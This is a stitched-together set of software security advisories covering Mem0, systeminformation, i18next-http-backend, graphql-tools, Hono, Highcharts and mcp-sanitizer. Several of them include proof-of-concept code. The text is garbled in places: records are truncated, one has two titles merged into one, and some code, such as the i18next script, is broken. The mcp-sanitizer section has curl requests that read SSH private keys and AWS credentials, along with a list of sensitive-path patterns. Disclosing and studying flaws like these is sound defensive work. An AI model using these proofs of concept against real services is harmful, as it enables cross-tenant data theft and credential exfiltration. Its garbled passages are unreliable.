Fixed in `seroval@1.6.8`. Streams and sequences are now internal class instances. The deserializer checks the source value with `instanceof`, so plain data and plugin values are rejected no matter which node id they use.

### Workarounds

Avoid plugins whose `deserialize` returns functions or objects with an `on` method when decoding untrusted input. Upgrading to 1.6.8 is recommended.

advisories.name: Mem0: Cross-tenant conversation leak via unescaped delimiter collision in session-scope key (_build_session_scope)
advisories.description:
Summary

_build_session_scope() in mem0/memory/main.py builds the conversation-history scope key used to fetch/store the last N raw messages by naively joining caller-supplied user_id/agent_id/run_id values with unescaped & and = delimiters:

def _build_session_scope(filters):
    parts = []
    for key in sorted(["user_id", "agent_id", "run_id"]):
        val = filters.get(key)
        if val:
            parts.append(f"{key}={val}")
    return "&".join(parts)

_validate_and_trim_entity_id() (the only validation applied to these values) rejects only empty/whitespace-only strings — it never forbids & or =. This scope string is then used as an exact-match key against a SQLite column (storage.py: WHERE session_scope = ?) to fetch the last 10 raw messages for a given scope (main.py, Phase 0 of _add_to_vector_store, both sync and async).

Impact

Any caller who controls only their own run_id (or agent_id) — a very common integration shape, since apps frequently pass a client-/session-supplied identifier straight through as run_id without namespacing — can craft a value containing &user_id=<victim> (or &agent_id=<victim>) that produces a scope string byte-for-byte identical to a different tenant's real scope string.

Concretely: Tenant A calls add(msgs, user_id="alice", run_id="proj-x") → scope "run_id=proj-x&user_id=alice". An attacker who can only set run_id calls add(msgs, run_id="proj-x&user_id=alice") → identical scope string. The attacker's next add() call:

1. Reads Tenant A's raw prior conversation via get_last_messages(session_scope) and splices it verbatim into the attacker's own LLM fact-extraction prompt — a direct cross-tenant confidentiality leak (conversation content, potentially including PII, credentials, etc.).
2. Writes into the same colliding row-set via save_messages(), whose eviction logic (DELETE FROM messages WHERE session_scope = ? AND id NOT IN (...)) can evict/interleave Tenant A's history — permanent cross-tenant data corruption, not just a read.

Reachable via the public Memory.add() / AsyncMemory.add() API, and by extension the REST server's POST /memories endpoint (which takes run_id/agent_id straight from the request body).

Reproduction

from mem0.memory.main import _build_session_scope

# Tenant A: real user_id + run_id
scope_a = _build_session_scope({"user_id": "alice", "run_id": "proj-x"})
print(scope_a)  # "run_id=proj-x&user_id=alice"

# Attacker: controls only run_id, embeds a fake user_id inside it
scope_c = _build_session_scope({"run_id": "proj-x&user_id=alice"})
print(scope_c)  # "run_id=proj-x&user_id=alice"

assert scope_a == scope_c  # byte-for-byte collision

A full end-to-end proof (actual add() calls, no mocking of the vulnerable functions) confirms the attacker's subsequent add() call receives the victim's raw prior message content via get_last_messages.

Suggested Fix

Reject & and = in _validate_and_trim_entity_id(), alongside the existing whitespace check — this is the single validation chokepoint already used by every entry point (add, search, get_all, delete_all), so the fix is centralized. Alternatively/additionally, encode each component unambiguously (percent-encode each id, or use a length-prefixed/JSON-encoded scope key) so no valid-character combination in one field can ever collide with a different partition.

Also affected: TypeScript SDK (npm mem0ai)

The same flaw exists in mem0-ts/src/oss/src/memory/index.ts,
Memory.buildSessionScope(), which joins agent_id/run_id/user_id into the same
`key=value&key=value` string with the delimiters unescaped:

  private buildSessionScope(filters: SearchFilters): string {
    const parts: string[] = [];
    for (const key of ["agent_id", "run_id", "user_id"].sort()) {
      const val = (filters as any)[key];
      if (val) parts.push(`${key}=${val}`);
    }
    return parts.join("&");
  }

The scope string is used the same way, as an exact-match key into the messages
table via SQLiteManager.getLastMessages() and saveMessages(), so the identical
forge, cross-tenant read and eviction all apply.

Verified against the current releases as of 2026-07-26: pip mem0ai v2.0.14 and
npm mem0ai ts-v3.1.2 both still contain the unescaped join.

Reporter: Abhinav Singh (GitHub: OfficialAbhinavSingh)

advisories.name: systeminformation has path traversal in Linux networkStats() that allows symlink-based file disclosure outside /sys/class/net
systeminformation has prototype pollution in `networkStats()` via the interface name
advisories.description:
## Summary

`networkStats()` keeps a per interface cache for computing `rx_sec` / `tx_sec` between calls.
The cache is a plain JavaScript object and is indexed with the interface name the caller
supplied. Passing the name `__proto__` makes every cache write land on `Object.prototype`
instead of the cache, polluting every object in the Node.js process.

An application is affected if it passes untrusted input as the `ifaces` argument of
`si.networkStats()` and runs on FreeBSD, OpenBSD or NetBSD.

## Details

### The vulnerable code

`lib/network.js` declares the cache as a plain object:

```js
const _network = {};
```

`calcNetworkSpeed()` writes into it, keyed by the interface name:

```js
} else {
  if (!_network[iface]) {
    _network[iface] = {};
  }
  _network[iface].rx_bytes  = rx_bytes;
  _network[iface].tx_bytes  = tx_bytes;
  _network[iface].rx_sec    = null;
  _network[iface].tx_sec    = null;
  _network[iface].ms        = Date.now();
  _network[iface].last_ms   = 0;
  _network[iface].operstate = operstate;
}
```

With `iface === '__proto__'` this misbehaves twice:

1. `_network['__proto__']` does not read a missing own property — it invokes the inherited
   `__proto__` getter and returns `Object.prototype`, which is truthy. The
   `if (!_network[iface])` guard therefore never creates the `{}` placeholder.
2. Each following assignment writes onto `Object.prototype`.

After one call, `rx_bytes`, `tx_bytes`, `rx_sec`, `tx_sec`, `ms`, `last_ms` and `operstate`
are visible on **every** object in the process. A second call takes the other branch
(`_network['__proto__'].ms` is now truthy) and keeps them updated.

### Why the existing sanitizing does not help

The interface name does pass through `util.sanitizeString(iface, true)` before it is used as
the cache key. That function is a **shell metacharacter** filter, built to stop command
injection in the `netstat` / `ifconfig` invocations — a different threat. Property names made
of letters and underscores are legitimate interface names and pass through untouched:

```
"a;id"        -> "aid"
"a$(id)"      -> "aid"
"a|id"        -> "aid"
"a`id`"       -> "aid"
"__proto__"   -> "__proto__"     <-- unchanged
"constructor" -> "constructor"   <-- unchanged
```

The sanitizer is doing its job; the gap is that no layer treats the value as an *object key*.

### Reachability

The cache write is guarded incidentally on three of four platform branches. These guards exist
for unrelated reasons and are not a deliberate defence:

| Platform | Code path | Reachable with an arbitrary name? |
| --- | --- | --- |
| Linux / Android | `fs.existsSync('/sys/class/net/' + ifaceSanitized)` | **No** — a non-existent interface returns early |
| macOS | requires `netstat` to emit a data row beyond the header | **No** — verified on macOS 27, `Object.prototype` stays clean |
| Windows | `if (rx_bytes && tx_bytes)` — requires a real adapter match | **No** |
| **FreeBSD / OpenBSD / NetBSD** | `if (!error) { …; result = calcNetworkSpeed(ifaceSanitized, …) }` | **Yes** — the call sits outside the parsing loop, so any successful `netstat` exit reaches it, and `netstat -ibndI <unknown>` prints only its header and exits `0` |

The important part is not that three platforms happen to be safe, but that nothing in the
design prevents the write. Any future platform branch without such a guard reopens the issue,
which is why the fix is applied at the cache rather than at the call sites.

### Age

The pattern predates the v5 line — `git log -S "_network[iface] = {}"` traces it back to a
refactoring before `v3.42.5`. The v3 and v4 lines are end of life; the advisory covers v5.

## Impact

The attacker controls which attributes appear on `Object.prototype` but not their values —
those come from the interface statistics (`rx_bytes`, `ms`, `operstate` …). The attribute
*names* are fixed by the library, so this is not an arbitrary-key pollution primitive.

The consequences are therefore application specific and arise from name collisions:

- Any application code that tests `if (obj.operstate)`, `if (obj.ms)` or similar on an object
  that should not have those properties now takes the wrong branch.
- `for…in` loops over plain objects gain seven extra enumerable keys, which can corrupt
  serialisation, configuration merging or validation logic.
- Libraries that use `{}` as a lookup map and check membership with `in` or truthiness can
  return values for keys that were never inserted.

No path to remote code execution is known, and the values cannot be chosen by the attacker.

const cache = {};                       // the declaration used by the library
calcNetworkSpeed('__proto__', 1, 2, 'up', 0, 0, 0, 0);

console.log({}.rx_bytes);               // 1
console.log({}.operstate);              // 'up'
console.log(Object.prototype.hasOwnProperty('rx_b

advisories.name: i18next-http-backend: Query-parameter injection through & and = in lng when loadPath/addPath puts {{lng}} in the query string
advisories.description:
### Summary

The URL-segment check added for GHSA-q89c-q3h5-w34g blocks `?`, `#`, `%`, `:`, `/` and `@` in `lng`, but not `&` or `=`, and the checked value is inserted into the URL without encoding. The README documents a multiload loadPath of the form `/locales/resources.json?lng=de+en&ns=ns1+ns2`. With a template like that, an attacker who controls the language value can add or override query parameters on the request the backend sends. By default the language comes from `?lng=`, a cookie or `Accept-Language`. This is the "query-string injection" impact described in GHSA-q89c; only the `?` form was closed.

Server side (Express + i18next-http-middleware, default options), `GET /?lng=de%26ns%3Dprivate%26admin%3Dtrue` makes the application request `…?lng=de&ns=private&admin=true&ns=common` from its own translations API.

### Details

The checks are in `lib/utils.js`. The base check (https://github.com/i18next/i18next-http-backend/blob/v4.0.3/lib/utils.js#L26-L44) rejects:

- empty or >128-character values and prototype keys;
- `..` and `\`;
- `/[?#%:\s]/`;
- control characters.

`isSafeLangUrlSegment` (https://github.com/i18next/i18next-http-backend/blob/v4.0.3/lib/utils.js#L51-L55) adds only `/` and `@`. **Neither function rejects `&` or `=`.**

```js
if (/[?#%:\s]/.test(v)) return false   // utils.js L40, no & or =
```

`interpolateUrl` then splits on `+`, checks each segment, and joins the **raw** segments into the template, with no encoding (https://github.com/i18next/i18next-http-backend/blob/v4.0.3/lib/utils.js#L159-L184, return at L174).

Call sites:

- `_readAny` builds the load URL with `interpolateUrl(resolvedLoadPath, { lng: languages.join('+'), ns: … })`: https://github.com/i18next/i18next-http-backend/blob/v4.0.3/lib/index.js#L64
- `create` builds the missing-key URL with `interpolateUrl(addPath, { lng, ns })`: https://github.com/i18next/i18next-http-backend/blob/v4.0.3/lib/index.js#L133

The README documents the query-shaped URL for multiloading (https://github.com/i18next/i18next-http-backend/blob/v4.0.3/README.md?plain=1#L130). The language value is attacker-controlled in normal setups, as GHSA-q89c itself says: detectors read `?lng=`, cookies, `localStorage` and request headers. i18next-http-middleware's `LanguageDetector` does the same on the server.

Where `?` is placed in the template determines which characters are structural. The fix treated only the path position. In a query position, `&` and `=` are the separators, so they must be rejected or encoded too.

**Suggested fix.** Reject `&` and `=` (and `;`) in both `lng` and `ns`; no BCP-47 language code or usable i18next namespace contains them. Alternatively, `encodeURIComponent` each `+`-joined segment when the placeholder appears after `?` in the template.

### Proof of concept

How to run (Node 18+; everything runs on 127.0.0.1, with a fake translations API and an Express app):

1. `mkdir i18next-poc && cd i18next-poc`
2. `npm init -y`
3. `npm i i18next@26.5.1 i18next-http-backend@4.0.3 i18next-http-middleware@3.9.9 express@5.3.0`
4. Save the script below as `poc.mjs`
5. `node poc.mjs`

```js

// {{lng}} in the query string (README multiload shape) gets extra parameters.
// Everything runs on 127.0.0.1: a fake translations API and an Express app.
import http from 'node:http'
import express from 'express'
import i18next from 'i18next'
import Backend from 'i18next-http-backend'
import middleware from 'i18next-http-middleware'

const seen = []
const api = http.createServer((req, res) => {
  seen.push(req.url)
  res.setHeader('content-type', 'application/json')
  res.end('{"hello":"hi"}')

await new Promise((r) => api.listen(0, '127.0.0.1', r))
const loadPath = `http://127.0.0.1:${api.address().port}/locales/resources.json?lng={{lng}}&ns={{ns}}`
const wait = () => new Promise((r) => setTimeout(r, 200))

console.log('[1] direct init')

advisories.description:
# Stale authentication state in `@graphql-tools/executor-legacy-ws`: per-request `extensions.connectionParams` persist in executor closure state and are replayed in a later caller's `connection_init`

## Report metadata

| Field | Value |
| --- | --- |
| Package | `@graphql-tools/executor-legacy-ws` (npm, `pkg:npm/%40graphql-tools/executor-legacy-ws`) |
| Repository | https://github.com/ardatan/graphql-tools |
| Component | `buildWSLegacyExecutor` (`packages/executors/legacy-ws/src/index.ts`) |
| Vulnerability class | Stale authentication state / credential reuse across requests |
| Verified against | Commit `b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1`; npm release `1.1.33` installed and exercised. During validation the same behaviour was also observed on the current latest release `1.1.35`, and the unreset closure is still present on `master`. |
| API surface | Public documented API (`buildWSLegacyExecutor`, and `request.extensions.connectionParams` on the returned executor) |
| Affected in default configuration | Yes — the factory returns a general, reusable `Executor` with no per-identity or single-use restriction, and no supported teardown clears the retained parameters. |

Version note: the originally recorded affected range was `<= 1.1.33`. Validation showed that range understates exposure — the same proof of concept leaks identically on `1.1.35`.

## Summary

`buildWSLegacyExecutor` keeps a single closure-scoped object, `executorConnectionParams`, for the lifetime of the executor. Every execution that carries `request.extensions.connectionParams` merges those keys into that object with `Object.assign`, and the object is merged into the `connection_init` payload each time a new WebSocket opens. Nothing ever removes keys: `cleanupWebsocket` terminates the socket and nulls the handle but leaves `executorConnectionParams` intact, and a later request that simply omits a key skips the conditional update entirely.

The consumer-side shape is a shared executor that forwards per-user credentials. When one long-lived executor serves multiple principals — the schema-stitching, gateway, or mesh pattern where each `ExecutionRequest` supplies its own `extensions.connectionParams` — a request that omits the auth key is sent to the downstream server with the previous caller's `Authorization`/tenant values in its `connection_init`, so the downstream server authenticates the later caller as the earlier user.

Behaviour of the neighbouring state in the same file:

- WebSocket handle (`websocket`) → reset on teardown in `cleanupWebsocket`, [lines 78-88](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L78-L88)
- Per-request `connectionParams` merge, present case → applied as documented, [lines 93-101](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L93-L101)
- `executorConnectionParams` closure object → **never reset; survives socket teardown and is re-sent on the next connection, [line 32](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L32) and [line 54](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/executors/legacy-ws/src/index.ts#L54)**

## Impact

A caller who supplies no credentials (or lower-privileged ones) can have its downstream GraphQL subscription executed under a previous user's retained token or tenant value, and can receive data that its own `connection_init` would not authorize. The credential itself is never disclosed to the attacker — it reaches the sink through closure storage, not because the attacker knows it — but the downstream authorization it represents is.

The new capability versus safe behaviour: without this bug, an anonymous request would open a connection whose `connection_init` contains only base options plus that request's own parameters, and the downstream server would treat it as anonymous. With it, the anonymous request inherits the victim's authorization. Validation also showed partial-overwrite merging: a later caller supplying only `{tenant: "<attacker tenant>"}` gets the victim's `Authorization` retained alongside its own tenant, i.e. an attacker-chosen tenant authenticated with someone else's bearer token.

Scoring note: **not scored.** No CVSS vector accompanies this finding, and exploitability depends on the consuming application's data flow rather than on the library alone. Consumers that construct a fresh executor per request are **not** affected — the in-repository `UrlLoader` wrapper ([`packages/loaders/url/src/index.ts:172-182`](https://github.com/ardatan/graphql-tools/blob/b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1/packages/loaders/url/src/index.ts#L172-L182)) builds a new executor for each request and therefore does not exhibit the persistence. # Cross-tenant subscription data leak in `@graphql-tools/executor-legacy-ws`: a shared `websocket.onmessage` is replaced on every `subscribe()`, and `DATA` frames are delivered without checking the protocol operation id

## Report metadata

| Field | Value |
| --- | --- |
| Package | `@graphql-tools/executor-legacy-ws` (npm, `pkg:npm/%40graphql-tools/executor-legacy-ws`) |
| Repository | https://github.com/ardatan/graphql-tools |
| Component | `buildWSLegacyExecutor` → the returned executor's `subscribe(observer)` / `websocket.onmessage` handler |
| Vulnerability class | Cross-tenant data leak (subscription results delivered to the wrong caller) |
| Verified against | Source at `b5d1c36ebb8ed3868260ffee5bbcbb423ad5c1f1` (package version 1.1.33); published npm tarball `1.1.33` with matching source at `d304214db06e8a4ce9cb41138f199e3bc6ed36f2`; the same behaviour also reproduces on the current release `1.1.35` |
| API surface | Public documented API (`buildWSLegacyExecutor`) |
| Affected in default configuration | Yes — `ensureWebsocket()` reuses an already-`OPEN` socket (`index.ts:35-42`), and the socket has a single mutable `onmessage` property (`index.ts:113`). No single-operation-only restriction is documented, and the return type is the general reusable `DisposableExecutor` (`packages/utils/src/executor.ts:34-57`) |

Affected version range: the range recorded for this finding is `<= 1.1.33`, but that is understated — the same proof of concept reproduces on `1.1.35`, and a byte diff of the built CJS output between `1.1.33` and `1.1.35` shows only one unrelated change (`rejectUnauthorized`).

## Summary

`buildWSLegacyExecutor` keeps one WebSocket in closure state and installs the message handler by assigning to the socket's single `websocket.onmessage` property inside `subscribe()`. Every new subscription therefore overwrites the previous subscriber's handler, and the handler's `case LEGACY_WS.DATA` branch calls `observer.next(data.payload)` without ever comparing `data.id` to the operation id that this subscription created at line 103 and sent with `START` at line 123. When one executor instance is reused for overlapping subscriptions, the most recent caller receives payloads belonging to the earlier caller, and the earlier caller receives nothing.

In a consuming application, the tainted input is an ordinary, correctly-tagged `DATA` frame emitted by the legitimate downstream server for the victim's operation. The attacker does not need to control or compromise that server; they only need to be able to start their own subscription through the same shared executor while the victim's subscription is active — the natural shape of a gateway, stitched schema, or any service that builds a remote executor once and reuses it per request.

The surrounding code shows the inconsistency:

- `packages/loaders/url/src/index.ts:262-295` (in-repo `UrlLoader` wrapper) → constructs a fresh legacy executor inside each request, so that caller avoids the shared state.
- `buildWSLegacyExecutor`'s returned executor, reused across callers → **unsafe: shared `onmessage` overwritten at line 113, `DATA` dispatched without an id check at lines 145-147**.
- `packages/loaders/url/src/index.ts:172-182` → also a production caller of the legacy executor; safe only insofar as the wrapper above rebuilds the executor per request, not because of any check in the executor itself.

## Impact

A user of a service that shares one legacy executor receives another user's private GraphQL subscription payloads verbatim, with the victim's authorization context, without ever having been authorized for that operation. The victim is simultaneously starved: their own iterator stops receiving the events they subscribed to, because their handler has been detached.

Without this bug, the attacker's observer would receive only results for their own operation — and in this implementation, no result at all, since their operation is never `START`ed after `CONNECTION_ACK` has already fired. The new capability is therefore reading data the attacker could not otherwise obtain by any request they are permitted to make, plus a denial of the victim's subscription stream.

Scoring note: no CVSS vector was computed for this finding, because exploitability depends on the consuming application's data flow — specifically whether one executor instance is shared across mutually untrusted callers. Consumers that construct a new executor per operation (as the in-repo `UrlLoader` wrapper does at `packages/loaders/url/src/index.ts:262-295`) are not affected by the cross-caller leak. The set of affected downstream consumers has not been enumerated: **unknown**.

## Preconditions

1. One executor value returned by `buildWSLegacyExecutor` is reused rather than constructing a new executor per operation. This is the normal use of an `Executor`: the contract is invoked once per `ExecutionRequest`, the code explicitly reuses an `OPEN` socket, and the returned value holds `Symbol.disp

advisories.name: @hono/node-server: `serveStatic` decodes the request path a second time, leading to bypass of middleware on static paths
advisories.description:
### Summary

`serveStatic` decodes the request path a second time after Hono has already decoded it for routing. A crafted request can be routed as one path and served as another, so middleware mounted on a static prefix does not run for a file under that prefix.

### Details

Hono decodes the request path once before routing. `serveStatic` decoded it again before resolving the file. With a malformed percent-encoded sequence, the first decode leaves part of the path encoded, the router matches the encoded form, and the second decode resolves the real directory. The file is still resolved inside the configured root; this is not a traversal outside it.

### Impact

An unauthenticated attacker may reach static files without the middleware on their prefix running, for example an authentication check. This affects applications that mount middleware on part of the directory served by `serveStatic`. Applications that serve only public files are not affected.

advisories.name: Highcharts: series column construction writes to Object.prototype

### Impact
When series columns are built from point objects, the point option keys are used directly as data column ids, so the write that populates a column reaches `Object.prototype` and the `Object` constructor. The properties remain in place once the chart has been built, and no user interaction is required beyond rendering the chart.

Consequences beyond disruption depend on the consuming application.

### Impact
The breadcrumbs `style` option is applied to the breadcrumb button as SVG attributes rather than as CSS, and the attribute names are not filtered. An attacker who controls the chart configuration can supply keys under `breadcrumbs.style` that name event handlers, and those keys become live handlers on the breadcrumb button, so the attacker's script runs in the origin of the page hosting the chart. The option is reached through `drilldown.breadcrumbs`, `navigation.breadcrumbs` and the `breadcrumbs` option of the treemap, sunburst and treegraph series. Exploitation requires that untrusted data reach the chart configuration and that a user drill down, or traverse into a level of a hierarchical series, so that the breadcrumbs render, and then hover over or activate the breadcrumb button. Charts rendered in styled mode do not apply the option and are not affected. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.

### Workarounds
Verified against published bundles on 10.0.0, 11.4.8, 12.3.0 and 13.0.2.

Load immediately after Highcharts, before any chart is created:

```js
// Workaround fix for all affected Highcharts versions: 10.0.0-13.0.2
((H)=>{const S=H.SVGElement.prototype,D=S._defaultSetter;S._defaultSetter=function _defaultSetter(v,k,e){/^on/i.test(k)||D.call(this,v,k,e)};})(Highcharts);
// End of the workaround fix
```

### Obtaining the patched version
The patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.0`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.0/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).

advisories.description:
### Impact
The data cursor keeps its listener and state bookkeeping in plain objects keyed by data table id, so a table id of `__proto__` supplied in the `dataPool` connector configuration resolves to `Object.prototype` when a sync registers its listeners, and the registration creates a property on `Object.prototype` named after the sync state and holding the internal listener array. The property name begins with a state prefix fixed by the library, to which the sync `group` option can append an attacker-chosen suffix, and its value is the library's own listener array, but the property is enumerable and visible on every object in the page, and emitting a lasting state for that table id then throws, so syncs that keep lasting states, such as `extremes`, stop working. Exploitation requires that untrusted data reach the Dashboards configuration and that a sync such as `highlight` or `extremes` be enabled on a component using that table, which the same configuration can do. No user interaction is required beyond loading the board.

The injected property is inert until other code on the page reads or enumerates it, so consequences depend on the consuming application.

advisories.name: Highcharts Core: HTML text parsing falls back to unfiltered `innerHTML` during printing
advisories.description:
### Impact
When the HTML text parser cannot obtain a document from `DOMParser` because the call throws, it falls back to assigning the raw markup to the `innerHTML` of an element created in the hosting document, and the allow-list is applied only to the resulting DOM afterwards. In Chromium the Trusted Types policy callback that the parser uses throws while a `beforeprint` handler is running, so if the hosting page re-renders the chart from a `beforeprint` handler, every HTML-rendered text option parsed at that moment, such as `useHTML` titles, axis labels and data labels or text set by responsive rules, is inserted unsanitized, and event handlers embedded in that markup run in the origin of the page hosting the chart. Exploitation requires that untrusted data reach the chart configuration, that the hosting page update the chart from a `beforeprint` handler in Chromium, and that printing be started, which the print item of the exporting menu does on its own. Charts built with Highcharts Stock, Maps and Gantt are included, since those ship from the same package as Core.

**Drop-in fix - for any versions affected (12.0.0-13.0.2).**
Add the below IIFE to run after Highcharts is loaded.

If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example https://code.highcharts.com/13.1.0/highcharts.js. advisories.name: Highcharts Core: `javascript:` URL in an `xlink:href` attribute survives text filtering and reaches exported charts
advisories.description:
### Impact
The filter applied to markup in text options checks `href`, `src` and a few similar attributes against an allowed-scheme list, but accepts `xlink:href` without that check, so an SVG anchor whose `xlink:href` is a `javascript:` URL passes the filter, whether or not the option is rendered with `useHTML`. In the live page the attribute is written without the XLink namespace, so browsers do not treat the anchor as a link there.

The attribute is preserved verbatim in the chart's serialised output: the SVG produced by the exporting module, including the default SVG download, declares the XLink namespace and contains the anchor, and so does the markup of the chart container. Any document that parses that output again, such as the downloaded SVG opened in a browser or a page that inlines exported or server-rendered chart markup, then holds a working link, and an attacker who controls the chart configuration can thereby run script in the origin of that document when a user activates the link.

Exploitation requires that untrusted data reach a text option such as the title, that the chart be exported or its markup be serialised and parsed again, and that a user activate the link.

### Workarounds
Drop-in fix for all affected versions (10.3.2 - 13.1.0).

Add the below IIFE to run after Highcharts is loaded, before creating a chart.

```
!function(t){var e=t&&t.AST;if(e&&"function"==typeof e.filterUserAttributes&&!e.xlinkHrefPatched){var r=e.filterUserAttributes,n=Object.prototype.hasOwnProperty;e.filterUserAttributes=function(t){return t&&n.call(t,"xlink:href")&&!o(t["xlink:href"])&&delete t["xlink:href"],r.call(this,t)},e.xlinkHrefPatched=!0}function o(t){var r=e.allowedReferences||["https://","http://","mailto:","/","../","./","#"];return"string"==typeof t&&r.some(function(e){return 0===t.indexOf(e)})}}(Highcharts);
```

### Obtaining the patched version
The patched releases are available from all the usual distribution channels. With npm, upgrade the affected package to the patched version listed above, for example `npm install highcharts@13.1.1`. If you load Highcharts from the CDN, use the versioned URLs on code.highcharts.com, for example `https://code.highcharts.com/13.1.1/highcharts.js`. For more on each installation method, see the [installation guide](https://www.highcharts.com/docs/getting-started/installation).

mcp-sanitizer: File Path Sanitizer Permits Arbitrary User-Home Absolute Paths
advisories.description:
## File Path Sanitizer Permits Arbitrary User-Home Absolute Paths

### Summary

`mcp-sanitizer` v1.3.3 explicitly whitelists `/home/` and `/Users/` as allowed absolute path prefixes in its file path validation logic (`src/utils/validation-utils.js:188-196`). As a result, paths such as `/home/alice/.ssh/id_rsa` and `/home/alice/.aws/credentials` pass through `sanitizer.sanitize()` with `blocked=false`, even though they point to highly sensitive files outside any configured safe root. Any consumer application that trusts the sanitized path and passes it to a filesystem read/write operation (e.g., `fs.readFile`) will expose arbitrary user-home directory files to an unauthenticated network attacker. Dynamic reproduction confirmed exfiltration of a simulated SSH private key and AWS credentials via a single HTTP POST request.

### Details

The vulnerability resides in the `validateFilePath` function inside `src/utils/validation-utils.js`. When an absolute path falls outside the configured safe root directories, the function performs a secondary check against a hardcoded allowlist:

```js
// src/utils/validation-utils.js:188-196
if (!isInSafeLocation && path.isAbsolute(normalizedPath)) {
  const allowedAbsolutePaths = ['/tmp/', '/var/tmp/', '/home/', '/Users/'];
  const isAllowedAbsolute = allowedAbsolutePaths.some(allowed =>
    normalizedPath.toLowerCase().startsWith(allowed.toLowerCase())
  );

  if (!isAllowedAbsolute) {
    throw new Error('Absolute path not in allowed safe directory');
  }
}
```

Because `/home/` and `/Users/` are included in `allowedAbsolutePaths`, any path beneath those directories — including `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.kube/config`, `~/.gnupg/`, etc. — is considered safe and passes validation unchanged.

The dangerous paths (`dangerousUnixPaths` at `src/utils/validation-utils.js:135`) only cover `/etc/`, `/proc/`, `/sys/`, `/dev/`, `/root/`, `/boot/`, `/usr/bin/`, and `/sbin/`. Home-directory sensitive subdirectories (`.ssh`, `.aws`, `.gnupg`, `.kube`, `.config`) are never checked.

The full data flow from a network request to the vulnerable return value is:

1. **`src/middleware/express.js:538-541`** — The Express middleware routes `file_reader`/`file_writer` tool parameters to `sanitizer.sanitize(params.file_path, { type: 'file_path' })`.
2. **`src/sanitizer/mcp-sanitizer.js:523-524`** — When `context.type === 'file_path'`, `_secureSanitizeFilePath()` is called.
3. **`src/sanitizer/mcp-sanitizer.js:683-687`** — `validateFilePath()` is invoked; if it does not throw, the normalized path is returned as the sanitized value.
4. **`src/utils/validation-utils.js:188-196`** — The `/home/` prefix check passes without error.
5. **`src/utils/validation-utils.js:200-201`** — The original, attacker-controlled absolute path is returned to the caller as a trusted, sanitized value.

A consumer application receiving `{ blocked: false, sanitized: '/home/victim/.ssh/id_rsa' }` is expected to use that path for I/O. The sanitizer's own `README` and middleware integration imply that a `blocked: false` result is safe to act upon.

**Suggested patch:**

```diff
--- a/src/utils/validation-utils.js
+++ b/src/utils/validation-utils.js
@@
   const dangerousUnixPaths = ['/etc/', '/proc/', '/sys/', '/dev/', '/root/', '/boot/', '/usr/bin/', '/sbin/'];
+  const sensitiveHomeFragments = [
+    '/.ssh/', '/.aws/', '/.gnupg/', '/.kube/', '/.config/',
+    '/.npmrc', '/.env'
+  ];
@@
+  const normalizedForSensitiveCheck = normalizedPath.replace(/\\/g, '/').toLowerCase();
+  if (sensitiveHomeFragments.some(fragment => normalizedForSensitiveCheck.includes(fragment))) {
+    throw new Error('Access to sensitive user configuration path not allowed');
+  }
@@
-    const allowedAbsolutePaths = ['/tmp/', '/var/tmp/', '/home/', '/Users/'];
+    const allowedAbsolutePaths = ['/tmp/', '/var/tmp/'];
```

### PoC

**Environment requirements:** Docker, Python 3, Node.js 20

**Step 1 — Build and start the reproduction container:**

```bash
# From the vuln-002/ directory
python3 poc.py
```

The script automatically:
1. Copies the `mcp-sanitizer` source into a Docker build context.
2. Creates simulated victim files at `/home/victim/.ssh/id_rsa` and `/home/victim/.aws/credentials` inside the container.
3. Builds a consumer HTTP server (`server.js`) that calls `sanitizer.sanitize()` and then `fs.readFile` on the returned path.
4. Sends the three test requests described below.

**Step 2 — Manual HTTP requests (after the container is running on port 13572):**

Control test — must be blocked:
```bash
curl -s -X POST http://127.0.0.1:13572/tool \
  -H 'Content-Type: application/json' \
  -d '{"tool_name":"file_reader","parameters":{"file_path":"/etc/passwd"}}'
# Expected: {"blocked": true}
```

Exploit test 1 — SSH private key exfiltration:
```bash
curl -s -X POST http://127.0.0.1:13572/tool \
  -H 'Content-Type: application/json' \
  -d '{"tool_name":"file_reader","parameters":{"file_path":"/home/victim/.ssh/id_rsa"}}'
# Expec
